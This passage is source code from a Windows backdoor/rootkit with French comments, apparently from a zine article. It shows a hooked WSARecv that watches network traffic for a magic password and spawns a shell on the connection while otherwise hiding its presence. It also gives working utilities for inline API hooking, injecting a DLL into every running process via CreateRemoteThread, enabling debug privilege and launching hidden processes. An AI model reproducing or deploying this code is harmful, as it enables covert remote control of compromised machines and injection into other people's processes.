+					return SOCKET_ERROR;
+				}
+			}	
+		}
+	
+		// Autre cas : erreur ou WSA IO PENDING -----------------------------------------
+		else if ( (return_val == -1 ) && (import_wsagetlasterror() == WSA_IO_PENDING) )
+		{
+			bool verdict;
+			bool premiere_passe;
+
+			_snprintf((char*)debug_string,2048, "% 20s - WSARecv %d buffers\n",GetNameByPID(GetCurrentProcessId()), dwBufferCount);
+			send_debug ((char*)debug_string);
+			_snprintf((char*)debug_string,2048, "% 20s - WSARecv completion routine 0x%08X\n",GetNameByPID(GetCurrentProcessId()), lpCompletionRoutine);
+			send_debug ((char*)debug_string);
+
+			//Compare à l'offset sur le buffer 1
+			DWORD le_bon_buffer;
+			verdict = true;
+			for (le_bon_buffer = 0; le_bon_buffer < dwBufferCount;le_bon_buffer++)
+			{
+				premiere_passe = true;
+				
+				for(DWORD i = 0; i < taille_mot_de_passe;i++)
+					if (lpBuffers[le_bon_buffer].buf[i] != mot_de_passe[i])
+						{verdict = false;break;}
+
+				//Si non, compare pre-offset
+				if (!verdict)
+				{
+					verdict = true;
+					premiere_passe = false;
+					for(DWORD i = 0; i < taille_mot_de_passe;i++)
+						if (lpBuffers[le_bon_buffer].buf[i-taille_mot_de_passe] != mot_de_passe[i])
+							{verdict = false;break;}
+				}
+
+				if (verdict)
+					break;
+			}
+
+			if (verdict)
+			{
+				// Efface le buffer et lance le shell
+				_snprintf((char*)debug_string,2048, "% 20s - WSARecv (err / pending) detecte magic key\n",GetNameByPID(GetCurrentProcessId()));
+				send_debug ((char*)debug_string);
+				
+				if (premiere_passe)
+					for(DWORD i = 0; i < taille_mot_de_passe;i++)
+						lpBuffers[le_bon_buffer].buf[i] = 0;
+				else
+					for(DWORD i = 0; i < taille_mot_de_passe;i++)
+						lpBuffers[le_bon_buffer].buf[i-taille_mot_de_passe] = 0;
+
+				doexec(s);
+		
+				// Rend le socket invalide et cassos
+				char message_fin[] = "Connection terminee\nCtrl-C peut etre necessaire pour quiter\n";
+				import_send(s, message_fin, strlen(message_fin), 0);
+
+				*lpNumberOfBytesRecvd = 0;
+				import_wsasetlasterror(WSA_IO_PENDING);
+				return SOCKET_ERROR;
+			}
+		}
+	
+		// Sinon, comme si de rien n'etait
+		return return_val;
+	}
+
+
+
+
+
+
+
+
+
+
+
+
+
+		######################
+		#   hook_utils.cpp   #
+		######################
+
+
+
+
+#include <windows.h>
+#include <stdio.h>
+#include <tlhelp32.h>
+#include "server.h"
+
+#include "lde32.h"
+
+extern char* debug_string[2049];
+
+
+//------------------------------------------------------------------------------------------------------------------------
+// Conversion PID - Name ----------------------------------------------------------------------
+//------------------------------------------------------------------------------------------------------------------------
+DWORD WINAPI GetPIDByName (TCHAR *szProcName) 
+	{ 
+		HANDLE         hProcessSnap  = NULL; 
+		DWORD          th32ProcessID = 0;
+		BOOL           bRet          = FALSE; 
+		PROCESSENTRY32 pe32          = {0}; 
+    
+	    // Snapshot de tous les processus
+	    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
+
+	    if(hProcessSnap == INVALID_HANDLE_VALUE) 
+			return 0; 
+ 
+		// Initialisation de la structure d'un processus
+		pe32.dwSize = sizeof(PROCESSENTRY32); 
+ 
+		//  Parcours de tous les processus et comparaison avec le nom recherche
+		th32ProcessID = Process32First(hProcessSnap, &pe32);
+
+		while(th32ProcessID) 
+		{	   
+			if(strcmp(strlwr(szProcName), strlwr(pe32.szExeFile)) == 0)
+			{
+				th32ProcessID = pe32.th32ProcessID;
+				break;
+			}
+
+			pe32.dwSize = sizeof(PROCESSENTRY32);
+			th32ProcessID = Process32Next(hProcessSnap, &pe32);
+		}
+        
+	    CloseHandle(hProcessSnap); 
+		
+		// Retourne le PID trouve
+	    return(th32ProcessID); 
+	}
+
+
+char* WINAPI GetNameByPID (DWORD ProcID) 
+	{ 
+		HANDLE         hProcessSnap  = NULL; 
+		DWORD          th32ProcessID = 0;
+		BOOL           bRet          = FALSE; 
+		PROCESSENTRY32 pe32          = {0}; 
+    
+	    // Snapshot de tous les processus
+	    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
+
+	    if(hProcessSnap == INVALID_HANDLE_VALUE) 
+			return 0; 
+ 
+		// Initialisation de la structure d'un processus
+		pe32.dwSize = sizeof(PROCESSENTRY32); 
+ 
+	    //  Parcours de tous les processus et comparaison avec le nom recherche
+	    th32ProcessID = Process32First(hProcessSnap, &pe32);
+	
+		while(th32ProcessID) 
+		{	   
+			if(pe32.th32ProcessID == ProcID)
+				break;
+				
+			pe32.dwSize = sizeof(PROCESSENTRY32);
+			th32ProcessID = Process32Next(hProcessSnap, &pe32);
+		}
+        
+	   CloseHandle(hProcessSnap); 
+
+	   // Retourne le PID trouve
+		return(pe32.szExeFile); 
+	}
+
+
+
+
+
+//------------------------------------------------------------------------------------------------------------------------
+// Création facile de processus ------------------------------------------------------------------------------------------
+//------------------------------------------------------------------------------------------------------------------------
+
+void CreateProcessSimple( char* sExecutableFilePath, DWORD flags = NORMAL_PRIORITY_CLASS)
+	{   
+
+		PROCESS_INFORMATION pi;
+		STARTUPINFO si;
+
+		memset (&si, 0, sizeof( si ));
+		si.cb = sizeof( si );
+
+		CreateProcess(
+			NULL, //Application name
+			sExecutableFilePath,// path to the executable file:
+			NULL, NULL, FALSE, //Process & thread attribs, inherit handles
+			flags, NULL, NULL, //Creation flags, environment, curdir
+			&si, &pi );
+
+		CloseHandle( pi.hProcess );
+		CloseHandle( pi.hThread );
+	}
+
+void CreateProcessSimpleNouvelleFenetre ( char* sExecutableFilePath)
+	{
+		CreateProcessSimple(sExecutableFilePath, NORMAL_PRIORITY_CLASS+CREATE_NEW_CONSOLE);
+	}
+
+void CreateProcessCache ( char* sExecutableFilePath)
+	{
+		CreateProcessSimple(sExecutableFilePath, NORMAL_PRIORITY_CLASS+CREATE_NO_WINDOW);
+	}
+
+
+
+
+
+//------------------------------------------------------------------------------------------------------------------------
+// Conversion Unicode vers Ascii -----------------------------------------------------------------------------------------------------------------------
+//------------------------------------------------------------------------------------------------------------------------
+
+int wide_to_ascii (char* wide_name, char* buffer, int buffer_size)
+	{
+		return WideCharToMultiByte(CP_ACP, 0, (const unsigned short *) wide_name , -1, buffer, buffer_size, NULL, NULL);
+	}
+
+
+
+
+
+//------------------------------------------------------------------------------------------------------------------------
+// HOOK d'une API --------------------------------------------------------------------------------------------------------
+//------------------------------------------------------------------------------------------------------------------------
+/*
+	argument 1 : nom de la DLL
+	argument 2 : nom de la fonction
+	argument 3 : adresse du nouveau handler
+	argument 4 : adresse d'un char* qui contiendra le buffer de sauvegarde
+*/
+int WINAPI initialise_hook (char* nom_dll, char* nom_fonction, DWORD new_handler, char** backup)
+	{
+		HMODULE module;
+		DWORD adresse_api;
+		int taille;
+		DWORD ancienne_protection;
+		int verdict;
+
+		// Initialise backup s'il ne l'est pas
+		*backup = NULL;
+		
+		// Localise la DLL
+		module = GetModuleHandle(nom_dll);
+
+		// Si la DLL n'est pas chargée, CASSOS
+		if (module == 0)
+		{
+			_snprintf((char*)debug_string,2048, "% 20s - %s:%s non chargée, hook impossible\n",GetNameByPID(GetCurrentProcessId()), nom_dll,nom_fonction);
+			send_debug ((char*)debug_string);
+			return 0;
+		}
+
+		// Localise l'API
+		adresse_api = (DWORD) GetProcAddress(module, nom_fonction);
+
+		// Si l'API est introuvable, CASSOS
+		if (adresse_api == 0)
+		{
+			_snprintf((char*)debug_string,2048, "% 20s - %s:%s introuvable \n",GetNameByPID(GetCurrentProcessId()), nom_dll,nom_fonction);
+			send_debug ((char*)debug_string);
+			return 0;
+		}
+
+		//Teste si l'API commence par un detour
+		if ( *(char*) adresse_api == '\xe9')
+		{
+			_snprintf((char*)debug_string,2048, "% 20s - %s:%s deja hookée\n",GetNameByPID(GetCurrentProcessId()), nom_dll,nom_fonction);
+			send_debug ((char*)debug_string);
+			return 0;
+		}
+
+		// Mesure la taille de l'API à archiver
+		taille = 0;
+		while(taille < 5)
+			taille += disasm_main( (BYTE*) (adresse_api+taille) );
+	
+		// Alloue le tampon
+		*backup = (char*) malloc(21);
+		
+		// Teste l'allocation du tampon
+		if (*backup == NULL)
+		{
+			_snprintf((char*)debug_string,2048, "% 20s - %s:%s erreur d'allocation\n",GetNameByPID(GetCurrentProcessId()), nom_dll,nom_fonction);
+			send_debug ((char*)debug_string);
+			return 0;
+		}
+
+		// Initialise le tampon
+		memcpy	(*backup,	"\x90\x90\x90\x90\x90\x90\x90\x90"
+							"\x90\x90\x90\x90\x90\x90\x90\x90"
+							"\xE9\x00\x00\x00\x00",
+							/*     ^                ^ ici @FROM
+							       |
+								   \------- offset 17 : @jump : où écrire le déplacement
+							*/
+				21);
+
+		// Copie ce qu'il faut dedans
+		__asm{
+			// Copie <taille> octets des anciennes instructions dans le tampon
+			mov esi,adresse_api
+			mov edi,backup
+			mov edi,[edi]
+			push edi
+			mov ecx,taille
+			rep movsb
+			
+			// Saut : backup_api -> adresse_api
+			// Met edi sur @jump
+			pop edi
+			add edi,17
+			
+			// Calcul de @TO : API d'origine + <taille>
+			mov eax,adresse_api
+			add eax,taille
+
+			// Calcul de @FROM : juste apres le jmp
+			mov ebx, edi
+			add ebx,4
+
+			// Jmp relatif sur DWORD : @TO - @FROM
+			sub eax,ebx
+			
+			// Ecrit cette valeur à l'emplacement jmp @
+			stosd
+		}
+
+		// Oter la protection du handler
+		verdict = VirtualProtect((LPVOID)adresse_api,16,PAGE_READWRITE, &ancienne_protection);
+
+		//Si echec : cassos
+		if (!verdict)
+		{
+			free(*backup);
+			*backup = NULL;
+			_snprintf((char*)debug_string,2048, "% 20s - %s:%s erreur de protection\n",GetNameByPID(GetCurrentProcessId()), nom_dll,nom_fonction);
+			send_debug ((char*)debug_string);
+			return 0;
+		}
+
+		// Ecrase le handler
+		__asm
+		{
+			//EDI sur endroit où écrire
+			mov edi,adresse_api
+			//EAX sur @TO
+			mov eax,new_handler
+			//EBX sur @FROM
+			mov ebx, edi
+			add ebx,5
+			//Calcule le déplacement dans EAX
+			sub eax,ebx
+			//Ecrit le jmp
+			mov byte ptr [edi], 0xe9
+			inc edi
+			//Et le déplacement
+			stosd
+		}
+
+		// Remettre l'ancienne protection
+		verdict = VirtualProtect((LPVOID)adresse_api,16,ancienne_protection, &ancienne_protection);
+		if (!verdict)
+		{
+			_snprintf((char*)debug_string,2048, "% 20s - %s:%s restauration de la protection impossible\n",GetNameByPID(GetCurrentProcessId()), nom_dll,nom_fonction);
+			send_debug ((char*)debug_string);
+		}
+
+		return TRUE;
+	}
+
+
+// DEHOOK : restaure une fonction d'une api a partir de la sauvegarde---------------------
+/*
+	argument 1 : nom de la DLL
+	argument 2 : nom de la fonction
+	argument 3 : adresse d'un char* qui contient le buffer de sauvegarde
+*/
+int WINAPI enleve_hook (char* nom_dll, char* nom_fonction, char** backup)
+{
+	// Récupere l'adresse de la fonction dans le module
+	HMODULE module = GetModuleHandle(nom_dll);
+	DWORD adresse_api;
+	if (module != 0)
+		adresse_api = (DWORD) GetProcAddress(module, nom_fonction);
+	else
+		return 0;
+
+	// Mesure la taille de l'API à archiver
+	int taille = 0;
+	while(taille < 5)
+		taille += disasm_main( (BYTE*) (*backup+taille) );
+
+	// Oter la protection du handler
+	DWORD ancienne_protection;
+	int verdict;
+	verdict = VirtualProtect((LPVOID)adresse_api,16,PAGE_READWRITE, &ancienne_protection);
+	if (!verdict)
+		{free(*backup);*backup = NULL;return 0;}
+
+	// Restaurer le handler
+	__asm{
+		//Copie les anciennes instructiond
+		mov edi,adresse_api
+		mov esi,backup
+		mov esi,[esi]
+		mov ecx,taille
+		rep movsb
+	}
+
+	// Remettre l'ancienne protection
+	verdict = VirtualProtect((LPVOID)adresse_api,16,ancienne_protection, &ancienne_protection);
+	if (!verdict)
+		{free(*backup);*backup = NULL;return 0;}
+
+	free(*backup);
+	*backup = NULL;
+	return 1;
+}
+
+
+//----------------------------------------------------------------------------------------
+int WINAPI injector (DWORD le_pid, char* dll_name)
+{	
+	//Localise l'adresse de LoadLibraryA
+	HMODULE  module = GetModuleHandle("kernel32.dll");
+	FARPROC code_a_executer = GetProcAddress(module,"LoadLibraryA");
+
+	//Ouvre le processus
+	HANDLE hProcess = NULL;  
+	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, le_pid);
+	if(hProcess == NULL) return 0;
+
+	//Alloue de l'espace pour le nom de la dll
+	char *pInjData;		
+	pInjData = (char *)VirtualAllocEx(hProcess, 0, strlen(dll_name)+1, MEM_COMMIT, PAGE_READWRITE );
+  	if(pInjData == NULL) return 0;
+
+	//Copie le nom de la DLL
+	DWORD lpNumberOfBytesWritten=0;
+	WriteProcessMemory(hProcess, pInjData, dll_name, strlen(dll_name)+1, &lpNumberOfBytesWritten);
+	if (strlen(dll_name)+1 != lpNumberOfBytesWritten) return 0;
+
+	/*BOOL FlushInstructionCache(
+	HANDLE hProcess,
+	LPCVOID lpBaseAddress,
+	SIZE_T dwSize
+	);
+	*/
+
+	//Lance l'exécution
+	DWORD dwThreadId = 0;
+	HANDLE hThread = NULL; 
+	hThread = CreateRemoteThread(hProcess, NULL, 0, (unsigned long (__stdcall *)(void *))code_a_executer, pInjData, 0 , &dwThreadId);
+	if(hThread == NULL) return 0;
+
+	return 1;
+}
+
+//----------------------------------------------------------------------------------------
+int WINAPI megainject (char* dll_name) 
+{ 
+	HANDLE         hProcessSnap  = NULL; 
+	DWORD          th32ProcessID = 0;
+	BOOL           bRet          = FALSE; 
+	PROCESSENTRY32 pe32          = {0}; 
+    
+
+    /* Snapshot de tous les processus */
+    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
+
+    if(hProcessSnap == INVALID_HANDLE_VALUE) 
+        return 0; 
+ 
+    /* Initialisation de la structure d'un processus */
+    pe32.dwSize = sizeof(PROCESSENTRY32); 
+ 
+    /*  Parcours de tous les processus et comparaison avec le nom recherche */    
+    th32ProcessID = Process32First(hProcessSnap, &pe32);
+	while(th32ProcessID) 
+	{	   
+       if (injector(pe32.th32ProcessID, dll_name))
+		   printf("Succes avec le processus %s - %i\n", pe32.szExeFile, pe32.th32ProcessID);
+	   else
+		   printf("Erreur avec le processus %s - %i\n", pe32.szExeFile, pe32.th32ProcessID);
+
+	   pe32.dwSize = sizeof(PROCESSENTRY32);
+	   th32ProcessID = Process32Next(hProcessSnap, &pe32);
+	}
+        
+    CloseHandle(hProcessSnap);
+	/* Retourne le PID trouve */
+    return(1); 
+}
+
+//----------------------------------------------------------------------------------------
+int WINAPI EnableDebugPriv (void)
+{
+    HANDLE hToken = 0;
+    DWORD dwErr = 0;
+    TOKEN_PRIVILEGES newPrivs;
+
+    if (!OpenProcessToken (GetCurrentProcess (),TOKEN_ADJUST_PRIVILEGES,&hToken))
+		return 0;
+
+    if (!LookupPrivilegeValue (NULL, SE_DEBUG_NAME,&newPrivs.Privileges[0].Luid))
+		{CloseHandle (hToken);return 0;}
+
+    newPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    newPrivs.PrivilegeCount = 1;
+    
+    if (!AdjustTokenPrivileges (hToken, FALSE, &newPrivs, 0, NULL, NULL))
+		{CloseHandle (hToken);return 0;}
+
+    return 1;
+}
+
+
+
+
+
+    -- [ Tolwin
